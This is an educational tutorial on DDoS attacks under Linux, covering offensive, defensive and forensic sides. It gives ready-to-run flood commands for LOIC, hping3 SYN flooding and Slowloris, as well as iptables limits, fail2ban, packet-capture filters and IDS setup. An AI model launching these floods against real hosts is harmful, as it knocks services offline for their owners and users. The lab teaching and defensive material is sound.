# **DDoS Attacks Practically on Linux**

## **1. Offensive Perspective (Simulating DDoS Attacks)**
⚠️ **Warning: Educational purpose only ** Conduct these activities in a controlled lab environment only.

### **1.1 Using LOIC (Low Orbit Ion Cannon)**
LOIC is a simple stress-testing tool that can simulate TCP, UDP, and HTTP floods.
#### **Installation:**
```bash
sudo apt install mono-complete
wget https://github.com/NewEraCracker/LOIC/archive/refs/heads/master.zip
unzip master.zip && cd LOIC-master
```
#### **Execution:**
```bash
mono LOIC.exe
```
Configure the target and initiate the attack.

### **1.2 Using Hping3 (SYN Flood)**
Hping3 can be used to send TCP SYN packets rapidly.
#### **Installation:**
```bash
sudo apt install hping3
```
#### **Execution:**
```bash
sudo hping3 -S -p 80 --flood <target-ip>
```

### **1.3 Using Slowloris (Application Layer Attack)**
Slowloris exhausts available HTTP connections on the target.
#### **Installation & Execution:**
```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py <target-ip>
```

---
## **2. Defensive Perspective (Mitigation Strategies)**
### **2.1 Using IPTables for Traffic Filtering**
#### **Block SYN Flood:**
```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```
#### **Block UDP Flood:**
```bash
sudo iptables -A INPUT -p udp -m limit --limit 10/s -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP
```

### **2.2 Using Fail2Ban for Rate Limiting**
#### **Installation:**
```bash
sudo apt install fail2ban
```
#### **Configuration:**
Edit `/etc/fail2ban/jail.local`:
```
[sshd]
enabled = true
maxretry = 3
bantime = 3600
```

---
## **3. Forensic Perspective (Analyzing DDoS Attacks)**
### **3.1 Using Wireshark**
Wireshark can capture and analyze packet-level data.
#### **Execution:**
```bash
sudo wireshark
```
Filter SYN flood packets using:
```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

### **3.2 Using Tcpdump**
Tcpdump allows real-time network traffic monitoring.
#### **Execution:**
```bash
sudo tcpdump -i eth0 port 80
sudo tcpdump -n -c 1000 'tcp[tcpflags] & (tcp-syn) != 0'
```

### **3.3 Using Netstat to Detect High Connections**
Detect excessive connections from an IP.
#### **Execution:**
```bash
netstat -ant | awk '{print $5}' | sort | uniq -c | sort -nr
```

---
## **4. Converting a Target System to Detect & Defend**
### **4.1 Using Snort (Intrusion Detection System)**
#### **Installation:**
```bash
sudo apt install snort
```

### **4.2 Using Suricata (IDS/IPS)**
#### **Installation & Execution:**
```bash
sudo apt install suricata
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

---
## **Final Notes**
- **Use Kali Linux** for offensive testing.
- **Use Ubuntu or CentOS** for defensive analysis.
- **Setup a private network** (VirtualBox or Raspberry Pi cluster) for ethical hacking.
- **Emphasize responsible cybersecurity practices.**
